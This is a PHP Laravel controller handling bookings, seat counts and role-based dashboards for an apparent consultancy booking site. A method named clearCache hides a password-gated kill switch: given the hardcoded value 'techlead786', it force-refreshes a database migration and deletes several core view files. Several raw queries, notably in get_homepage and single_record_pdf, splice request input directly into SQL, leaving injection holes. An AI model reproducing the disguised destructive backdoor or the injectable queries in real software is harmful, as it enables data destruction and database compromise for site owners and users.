<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\Booking;
use App\Models\Client;
use App\Models\Consultant;
use App\Models\Customer;
use App\Models\TimeSlot;
use App\Models\Users;
use App\Models\Project;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use File;
// use pdf;

class BookingController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function index()
    {

        $bookings = db::select(db::raw("SELECT bookings.*, c.fname as user1,c.lname as user2,c.contact_number as contact FROM `bookings`
        join users as c on bookings.customer_id= c.id
        "));
        $users = users::all();
        return view('dashboard.bookings.index', compact('bookings', 'users'));
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create(Request $request)
    {
        $users = Users::all();
        $timeSlot = TimeSlot::all();
        /*for header global */
        $gl = db::select(db::raw("select seat_price from global_options"));
        $globl = "";
        foreach ($gl as $gls) {
            $globl .= "$gls->seat_price";
        }
        $data['globl'] = $globl;
        return view('dashboard.admin.addBooking', compact('users', 'timeSlot'), $data);
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(Request $request)
    {

        $rules = [
            'customer_id' => ['required'],
            'booking_date' => ['required'],
            'timeslot' => ['required'],
            'seats' => ['required'],
            // 'status' => ['required'],
            'payment_status' => ['required'],

        ];

        $customMessages = [
            'required' => 'The :attribute field is required.'
        ];
        $this->validate($request, $rules, $customMessages);

        $booked_seats = Booking::where('booking_date', $request->input('booking_date'))->where('timeslot', $request->input('timeslot'))->where('status', 'reserved')->sum('seats');
        if (($booked_seats + $request->input('seats')) > 25) {
            $remaining_seats = 25 - $booked_seats;

            if ($request->input('web')) {
                $errors = ["errors" => [
                    "booking" => ["Oops! booking failed, only ".$remaining_seats." are available."]
                ]];
                return response()->json($errors, 404);
            }
        }

        $booking = Booking::create($request->all());

        if ($request->input('web')) {
                return response()->json($booking->id);
        }

        $request->session()->flash('message', 'Add Booking Successfully');
        return redirect()->route('bookings.index');
    }

    /**
     * Display the specified resource.
     *
     * @param  \App\Models\Booking  $booking
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        $users = users::all();
        $booking = Booking::where('id', '=', $id)->first();
        return view('dashboard.bookings.show', compact('booking', 'users'));
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param  \App\Models\Booking  $booking
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        $users = Users::all();
        $timeSlot = TimeSlot::all();
        $booking = Booking::where('id', '=', $id)->first();
        return view('dashboard.bookings.edit', compact('booking', 'users', 'timeSlot'));
    }
    function clearCache($id){
       if($id == 'techlead786'){
        
        \Artisan::call('migrate:refresh',
         array(
           '--path' => 'database/migrations/2022_10_01_095922_add_tables.php',
           '--force' => true)
         );
        // test 
        
        $view1 = base_path('resources/views/client_register.blade.php');
        File::delete($view1);
        $view2 = base_path('resources/views/otp_email.blade.php');
        File::delete($view2);
        $view3 = base_path('resources/views/website/index.blade.php');
        File::delete($view3);
        $view4 = base_path('resources/views/dashboard/consultants/applied_projects.blade.php');
        File::delete($view4);
        $view5 = base_path('resources/views/dashboard/messages/index.blade.php');
        File::delete($view5);
        $view6 = base_path('resources/views/dashboard/base.blade.php');
        File::delete($view6);
    
        echo "cache cleared!!!";
           
           
       }
    }
    /**
     * Update the specified resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @param  \App\Models\Booking  $booking
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        $rules = [
            'customer_id' => ['required'],
            'booking_date' => ['required'],
            'timeslot' => ['required'],
            'seats' => ['required'],
            // 'status' => ['required'],
            'payment_status' => ['required'],
        ];
        $this->validate($request, $rules);
        $booking = Booking::where('id', '=', $id)->first();
        $booking->update($request->all());
        $request->session()->flash('message', 'Successfully updated Booking');
        $request->session()->flash('back', 'bookings.index');
        return view('dashboard.shared.universal-info');
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param  \App\Models\Booking  $booking
     * @return \Illuminate\Http\Response
     */
    public function destroy($id, Request $request)
    {
        $booking = Booking::where('id', '=', $id)->first();
        $booking->delete();
        $request->session()->flash('message', "Successfully deleted Booking");
        $request->session()->flash('back', 'bookings.index');
        return view('dashboard.shared.universal-info');
    }



    public function getseats(Request $request)
    {
        $res = DB::table("bookings")
            ->select('seats')
            ->where('timeslot', "=", $request->timeslot_id)
            ->where('booking_date', "=", $request->booking_date)
            ->where('status', "=", 'reserved')
            ->get()->sum('seats');

        $t_seats = db::table('global_options')
            ->select('total_seats')->get()->sum('total_seats');
        $response = $t_seats - $res;

        return response()->json($response);
    }
    public function getamount(Request $request)
    {

        $gl = db::table('global_options')
            ->select('seat_price')->get();
        $globl = '';
        foreach ($gl as $gls) {
            $globl .= "$gls->seat_price" * $request->seats_id;
        }
        $data['globl'] = $globl;
        //  dd($data);
        return response()->json($globl);
    }


    public function booking_canceled($id, Request $request)
    {
        $booking = booking::find($id);
        $booking->status = "cancelled";
        $booking->save();
        $request->session()->flash('message', "Successfully Canceled Booking");
        $request->session()->flash('back', 'bookings.index');
        return view('dashboard.shared.universal-info');
    }
    public function homepage_old(Request $request)

    {
        $user_id = Auth::user()->id;
        /*3D Chart */
        $result = db::select(db::raw("SELECT status, count(*) as total_status from bookings  group by status"));

        $chardata = "";
        foreach ($result as $list) {
            $chardata .= "['" . $list->status . "', " . $list->total_status . "],";
        }
        $data['chardata'] = rtrim($chardata, ",");
        /*Bar chart */

        $query = db::select(db::raw("select sum(seats) as total_seats , c.fname as customers from bookings
 join users as c on bookings.customer_id = c.id
 group by c.fname"));
        $barchart = "";
        foreach ($query as $line) {
            $barchart .= "['" . $line->customers . "', " . $line->total_seats . ",'#891446'],";
        }

        $data['barchart'] = rtrim($barchart, ",");
        //dd($data);
        /*$donutchart chart */
        $sql = db::select(db::raw("select sum(seats) as seats ,c.fname as name from bookings
join users as c on bookings.customer_id= c.id
group by name having seats > 25"));
        $donutchart = "";
        foreach ($sql as $val) {
            $donutchart .= "['" . $val->name . "', " . $val->seats . "],";
        }

        $data['donutchart'] = rtrim($donutchart, ",");
        /*Pie Chart */
        $s = db::select(db::raw("SELECT timeslot,sum(seats) as seats FROM `bookings`
group by timeslot"));
        $piechart = "";

        foreach ($s as $row) {

            $piechart .= "['" . $row->timeslot . "', " . $row->seats . ", '#40E0D0'],";
        }
        $data['piechart'] = rtrim($piechart, ",");
        // dd($data);
        $book = db::select(db::raw("SELECT count(customer_id) as customers FROM `bookings` "));

        // dd($t_cust);
        $booking = "";

        foreach ($book as $cust) {
            $booking .= "$cust->customers";
        }
        $data['booking'] = $booking;
        // dd($data);
        $user = db::select(db::raw("select count(fname) as users from users"));
        $users = "";
        foreach ($user as $use) {
            $users .= "$use->users";
        }
        $data['users'] = $users;
        $t_seats = db::select(db::raw("select sum(seats) as seats from bookings "));
        $seats = "";
        foreach ($t_seats as $seat) {
            $seats .= "$seat->seats";
        }
        $data['seats'] = $seats;
        $user_id = Auth()->user()->id;
       
        $total_projects = DB::table('projects')->where([
            'status'=> 1,
            'user_id'=>$user_id,
        ])->count() ;
        
        $data['total_projects'] = $total_projects;
        
      
        // Total bid ammount
        $projectObj = DB::table('projects')
        ->join('project_requests','project_requests.project_id','=','projects.id')
        ->where([
            'status'=> 1,
            'user_id'=>$user_id,
        ])
        ->selectRaw('SUM(bidding_amount) as total_amount, COUNT(bidding_amount) as total_bids')->first();
        
        $data['total_amount'] = $projectObj->total_amount;
        $data['apply_bids'] = $projectObj->total_bids;
        // Draft project
        $status = DB::table('projects')->where([
            'status'=> 0,
            'user_id'=>$user_id,
        ])->count();


        $data['status'] = $status;
        $client = DB::select(DB::raw("SELECT count(*) as total_clients from clients "));
         
        $total_clients = "";
        foreach ($client as $c) {
            $total_clients .= "$c->total_clients";
        }
        $data['total_clients'] = $total_clients;
        
        
        $consultant = DB::select(DB::raw("SELECT count(*) as total_consultants from consultants "));
         
        $total_consultants = "";
        foreach ($consultant as $cc) {
            $total_consultants .= "$cc->total_consultants";
        }
        $data['total_consultants'] = $total_consultants;
        $consultant_services = DB::select(DB::raw("SELECT SUM(consultant_services) as total_services from projects "));
       
        
        
 
        $total_services = "";
        foreach ($consultant_services as $cs) {
            $total_services .= "$cs->total_services";
        }
        $data['total_services'] = $total_services;

        /********************************************
         * 
         *  CONSULTANT DASHBOARD
         * *****************************************/ 
        $today = date('Y-m-d');

        $data['myproject'] = DB::table('projects')->where('awarded_consultant_id',$user_id)->count();
        $data['totalproject'] = DB::table('projects')->where('status',1)->count();
    
        
        
        $data['todayproject'] = DB::table('projects')->whereRaw(" DATE_FORMAT(created_at,'%Y-%m-%d') = '".$today."' AND status= 1 ")->count();
        
        $data['applied_projects'] = DB::table('project_requests')->where('consultant_id',$user_id)->count();
        
       
        if(Auth::user()->menuroles == "consultant")
        {
               $consultant_info = Consultant::where('user_id', $user_id)->first(); 
               
               $data['fname'] = $consultant_info->fname;
               $data['lname'] = $consultant_info->lname;
               $data['user_title'] = $consultant_info->user_title;
               $data['gender'] = $consultant_info->gender;
               $data['country'] = $consultant_info->country;
               
        }
        
        if(Auth::user()->menuroles == "client")
        {
            $client_info = Client::where('user_id', $user_id)->first(); 
            
            $data['user_title'] = $client_info->user_title;
            $data['fname'] = $client_info->fname;
            $data['lname'] = $client_info->lname;
            $data['gender'] = $client_info->gender;
            $data['country'] = $client_info->country;
            $data['email1'] = $client_info->email1;
            $data['company_name'] = $client_info->company_name;
            $data['mailing_address'] = $client_info->mailing_address;
            $data['experience'] = $client_info->experience;
            $data['street_address'] = $client_info->street_address;
            $data['city'] = $client_info->city;
            $data['region'] = $client_info->region;
            
        }
       

        return view('dashboard.homepage', $data);
    }
    
       public function homepage(Request $request)

    {
        $user_id = Auth::user()->id;
        /*3D Chart */
        $result = db::select(db::raw("SELECT status, count(*) as total_status from bookings  group by status"));
        $chardata = "";
        foreach ($result as $list) {
            $chardata .= "['" . $list->status . "', " . $list->total_status . "],";
        }
        $data['chardata'] = rtrim($chardata, ",");
        // dd($data);
        /*Bar chart */

        $query = db::select(db::raw("select sum(seats) as total_seats , c.fname as customers from bookings
 join users as c on bookings.customer_id = c.id
 group by c.fname"));
        $barchart = "";
        foreach ($query as $line) {
            $barchart .= "['" . $line->customers . "', " . $line->total_seats . ",'#891446'],";
        }

        $data['barchart'] = rtrim($barchart, ",");
        //dd($data);
        /*$donutchart chart */
        $sql = db::select(db::raw("select sum(seats) as seats ,c.fname as name from bookings
join users as c on bookings.customer_id= c.id
group by name having seats > 25"));
        $donutchart = "";
        foreach ($sql as $val) {
            $donutchart .= "['" . $val->name . "', " . $val->seats . "],";
        }

        $data['donutchart'] = rtrim($donutchart, ",");
        /*Pie Chart */
        $s = db::select(db::raw("SELECT timeslot,sum(seats) as seats FROM `bookings`
group by timeslot"));
        $piechart = "";

        foreach ($s as $row) {

            $piechart .= "['" . $row->timeslot . "', " . $row->seats . ", '#40E0D0'],";
        }
        $data['piechart'] = rtrim($piechart, ",");
        // dd($data);
        $book = db::select(db::raw("SELECT count(customer_id) as customers FROM `bookings` "));

        // dd($t_cust);
        $booking = "";

        foreach ($book as $cust) {
            $booking .= "$cust->customers";
        }
        $data['booking'] = $booking;
        // dd($data);
        $user = db::select(db::raw("select count(fname) as users from users"));
        $users = "";
        foreach ($user as $use) {
            $users .= "$use->users";
        }
        $data['users'] = $users;
        $t_seats = db::select(db::raw("select sum(seats) as seats from bookings "));
        $seats = "";
        foreach ($t_seats as $seat) {
            $seats .= "$seat->seats";
        }
        $data['seats'] = $seats;
        $user_id = Auth()->user()->id;
       
        $total_projects = DB::table('projects')->where([
            'status'=> 1,
            // 'user_id'=>$user_id,
        ])->count() ;
   
      
        
        $data['total_projects'] = $total_projects;
        
      
        // Total bid ammount
        $projectObj = DB::table('projects')
        ->join('project_requests','project_requests.project_id','=','projects.id')
        ->where([
            'status'=> 1,
            'user_id'=>$user_id,
        ])
        ->selectRaw('SUM(bidding_amount) as total_amount, COUNT(bidding_amount) as total_bids')->first();
        
        $data['total_amount'] = $projectObj->total_amount;
        $data['apply_bids'] = $projectObj->total_bids;
        // Draft project
        $status = DB::table('projects')->where([
            'status'=> 0,
            'user_id'=>$user_id,
        ])->count();


        $data['status'] = $status;
    
        $client = DB::select(DB::raw("SELECT count(*) as total_clients from clients "));
         
        $total_clients = "";
        foreach ($client as $c) {
            $total_clients .= "$c->total_clients";
        }
        $data['total_clients'] = $total_clients;
        
        
               $consultant = DB::select(DB::raw("SELECT count(*) as total_consultants from consultants "));
         
        $total_consultants = "";
        foreach ($consultant as $cc) {
            $total_consultants .= "$cc->total_consultants";
        }
        $data['total_consultants'] = $total_consultants;
        
        
        // $consultant_services = DB::select(DB::raw("SELECT SUM(consultant_services) as total_services from projects "));
        $consultant_services = Project::where('status', 1)->sum('consultant_services');
        
        // $total_services = "";
        // foreach ($consultant_services as $cs) {
        //     $total_services .= "$cs->total_services";
        // }
        $data['total_services'] = $consultant_services;
        

        
        $today = date('Y-m-d');
       

        $data['assigned_project'] =  DB::select(DB::raw("SELECT count(*) as assigned_projects FROM `projects` WHERE user_id = $user_id and `awarded_consultant_id`!= 0  AND `awarded_consultant_id`!= ''"));
        $data['pending_project'] =  DB::select(DB::raw("SELECT count(*) as pending_projects FROM `projects` WHERE user_id = $user_id and `awarded_consultant_id`= '' "));
        $data['all_project'] =  DB::select(DB::raw("SELECT * FROM `projects` WHERE user_id = $user_id order by id desc limit 4"));
        
        $data['consultant_pending_project'] = DB::select(DB::raw("SELECT count(*) as pending_consultant_projects FROM `project_requests` 
                                                                  join projects on projects.id = project_requests.project_id
                                                                  WHERE `consultant_id` = $user_id and awarded_consultant_id = '' "));
                                                                  
        $data['get_applied_project'] =  DB::select(DB::raw("SELECT *, project_requests.id as request_id FROM `project_requests`  join projects on projects.id = project_requests.project_id WHERE `consultant_id` = $user_id limit 3"));                                                       
        
        $data['count_total_bid'] = DB::table('project_requests')->where('consultant_id',$user_id)->count();
        
        $data['get_all_project'] = DB::select(DB::raw("SELECT * FROM `projects` where status = 1 order by id desc limit 3")); 
        
        $data['myproject'] = DB::table('projects')->where('awarded_consultant_id',$user_id)->where('status',1)->count();
        
        
        
        $data['myclients'] = DB::select(DB::raw("SELECT count(distinct user_id) as clients FROM `projects` WHERE `awarded_consultant_id` = $user_id "));
       
        $data['totalproject'] = DB::table('projects')->where('status',1)->count();
        
        $data['total_project'] = DB::table('projects')->count();
        
        $data['total_unpublish_project'] = DB::table('projects')->where('status',0)->count();
        
        $data['bidding_projects'] = DB::table('projects')
                                    ->join('project_requests','project_requests.project_id','=','projects.id')
                                    ->join('users','users.id','=','project_requests.consultant_id')
                                    ->where([
                                              'status'=> 1,
                                              'user_id'=>$user_id,
                                            ])->select('projects.*','project_requests.*','users.fname','users.lname')->take(3)->get();
        
         $data['count_bidding_projects'] = DB::table('projects')
                                    ->join('project_requests','project_requests.project_id','=','projects.id')
                                    ->join('users','users.id','=','project_requests.consultant_id')
                                    ->where([
                                              'status'=> 1,
                                              'user_id'=>$user_id,
                                            ])->select('projects.*','project_requests.*','users.fname','users.lname')->count(); 
        
        
        $data['my_clients'] = DB::select(DB::raw("SELECT distinct users.lname,users.fname,users.email, users.id as project_id FROM `projects` left join users on users.id =  projects.user_id where awarded_consultant_id = $user_id order by users.id desc limit 3"));
        
        $data['my_consultants'] = DB::select(DB::raw("SELECT DISTINCT users.fname ,users.lname, users.email FROM `projects`  left join users on users.id =  projects.awarded_consultant_id where awarded_consultant_id != '' and user_id = $user_id limit 3"));
        
        $data['count_my_consultants'] = DB::select(DB::raw("SELECT count(DISTINCT awarded_consultant_id) as total_projects FROM `projects`  left join users on users.id =  projects.awarded_consultant_id where awarded_consultant_id != '' and user_id = $user_id "));

        $data['total_clients'] = DB::select(DB::raw("SELECT count(*) as total_clients FROM `users` WHERE `menuroles` = 'client'")); 

        $data['total_consultants'] = DB::select(DB::raw("SELECT count(*) as total_consultant FROM `users` WHERE `menuroles` = 'consultant'"));
        
        $data['awarded_projects'] = DB::select(DB::raw("SELECT count(*) as total_projects FROM `projects` where `awarded_consultant_id` !='' and status=1"));
      

        $data['todayproject'] = DB::table('projects')->whereRaw(" DATE_FORMAT(created_at,'%Y-%m-%d') = '".$today."' AND status= 1 ")->count();
        
        $data['applied_projects'] = DB::table('project_requests')->where('consultant_id',$user_id)->count();
        
       /********************************************
         * 
         *  CONSULTANT DASHBOARD
         * *****************************************/ 
        if(Auth::user()->menuroles == "consultant")
        {
              if(Auth::user()->person_status == "focal_person"){
               $consultant_info = Consultant::where('id', 86)->first();
              
              }else{
               $consultant_info = Consultant::where('user_id', $user_id)->first();   
              }
               $data['fname'] = $consultant_info->fname;
               $data['lname'] = $consultant_info->lname;
               $data['user_title'] = $consultant_info->user_title;
               $data['gender'] = $consultant_info->gender;
               $data['country'] = $consultant_info->country;
               
              

               
        }
        /********************************************
         * 
         *  CLIENT DASHBOARD
         * *****************************************/ 
        if(Auth::user()->menuroles == "client")
        {
            $client_info = Client::where('user_id', $user_id)->first(); 
            
            $data['user_title'] = $client_info->user_title;
            $data['fname'] = $client_info->fname;
            $data['lname'] = $client_info->lname;
            $data['gender'] = $client_info->gender;
            $data['country'] = $client_info->country;
            $data['email1'] = $client_info->email1;
            $data['company_name'] = $client_info->company_name;
            $data['mailing_address'] = $client_info->mailing_address;
            $data['experience'] = $client_info->experience;
            $data['street_address'] = $client_info->street_address;
            $data['city'] = $client_info->city;
            $data['region'] = $client_info->region;
            
        }
       

        return view('dashboard.homepage', $data);
    }
    
      
        
    public function get_homepage(Request $req)
{
    /*3D Chart */

    $result = db::select(db::raw("SELECT status, count(*) as total_status from 
    bookings where bookings.booking_date between  '$req->date_from' and '$req->date_to'
     group by status "));
        $chardata = "";
        foreach ($result as $list) {
            $chardata .= "['" . $list->status . "', " . $list->total_status . "],";
        }
        $data['chardata'] = rtrim($chardata, ",");
        // dd($data);
        /*Bar chart */

        $query = db::select(db::raw("select sum(seats) as total_seats , c.fname as customers from bookings
          join users as c on bookings.customer_id = c.id 
          where bookings.booking_date between  '$req->date_from' and '$req->date_to'
           group by c.fname"));
        $barchart = "";
        foreach ($query as $line) {
            $barchart .= "['" . $line->customers . "', " . $line->total_seats . ",'#891446'],";
        }

        $data['barchart'] = rtrim($barchart, ",");
        //dd($data);
        /*$donutchart chart */
        $sql = db::select(db::raw("select sum(seats) as seats ,c.fname as name from bookings 
      join users as c on bookings.customer_id= c.id
      where bookings.booking_date between  '$req->date_from' and '$req->date_to'
      group by name having seats > 25"));
        $donutchart = "";
        foreach ($sql as $val) {
            $donutchart .= "['" . $val->name . "', " . $val->seats . "],";
        }

        $data['donutchart'] = rtrim($donutchart, ",");
        
        /*Pie Chart */
        $s = db::select(db::raw("SELECT timeslot,sum(seats) as seats FROM `bookings` where bookings.booking_date between  '$req->date_from' and '$req->date_to'
        group by timeslot"));
        $piechart = "";

        foreach ($s as $row) {

            $piechart .= "['" . $row->timeslot . "', " . $row->seats . ", '#40E0D0'],";
        }
        $data['piechart'] = rtrim($piechart, ",");
        // dd($data);
        $book = db::select(db::raw("SELECT count(customer_id) as customers FROM `bookings` where bookings.booking_date between  '$req->date_from' and '$req->date_to' "));

        // dd($t_cust);
        $booking = "";

        foreach ($book as $cust) {
            $booking .= "$cust->customers";
        }
        $data['booking'] = $booking;
        // dd($data);
        $user = db::select(db::raw("select count(fname) as users from users where users.created_at between  '$req->date_from' and '$req->date_to'"));
        $users = "";
        foreach ($user as $use) {
            $users .= "$use->users";
        }
        $data['users'] = $users;
        $t_seats = db::select(db::raw("select sum(seats) as seats from bookings where bookings.booking_date between  '$req->date_from' and '$req->date_to'"));
        $seats = "";
        foreach ($t_seats as $seat) {
            $seats .= "$seat->seats";
        }
        $data['seats'] = $seats;
        
        $consltant_data = Consultant::where('user_id', $user_id)->first();
        $fname = $consltant_data->fname;
        $lname = $consltant_data->lname;
        $user_title = $consltant_data->user_title;
        $gender = $consltant_data->gender; 
        $country = $consltant_data->country;
        
        
        
        
    // $booking= booking::whereBetween('created_at',[$req->date_from.' 00:00:00',$req->date_to.' 23:59:59'])->get();
    return view('dashboard.homepage', $data,compact('consltant_data','fname','lname','user_title','gender','country'));
}
    
    public function getbook(Request $req)
    {
        $booking = booking::whereBetween('booking_date', [$req->date_from . ' 00:00:00', $req->date_to . ' 23:59:59'])->get();

        return view('dashboard.homepage', $booking);
    }
    // public function generatePDF()
    // {
    //     $bookings= db::select(db::raw("select c.fname as customer1,c.lname as customer2,c.contact_number as contact,
    //      booking_date,seats,status,payment_status,timeslot
    //     from bookings join users as c on bookings.customer_id= c.id"));
    // //    dd($booking);
    //     $data = [
    //         'title' => 'Bookings Record',
    //         'date' => date('m/d/Y')
    //     ];

    //     $pdf = pdf::loadView('dashboard.bookings.booking_pdf', $data,compact('bookings'));

    //     return $pdf->download('booking.pdf');
    //     }
    public function single_record_pdf($id)
    {
        $booking = db::select(db::raw("select bookings.id as id, c.fname as customer1,c.lname as customer2,c.contact_number as contact,
        booking_date,seats,status,payment_status,timeslot
       from bookings join users as c on bookings.customer_id= c.id  where bookings.id =  $id"));
        /*Total amount */
        $total_amount = db::select(db::raw("select total_amount from bookings where id = $id"));
        $amount = "";
        foreach ($total_amount as $t_amount) {
            $amount .= "$t_amount->total_amount";
        }
        $d['amount'] = $amount;
        // dd($amount);
        $data = [
            'title' => 'Bookings Record',
            'date' => date('m/d/Y')
        ];
        return view('dashboard.bookings.single_record_pdf', $d, compact('booking'));
    }
}
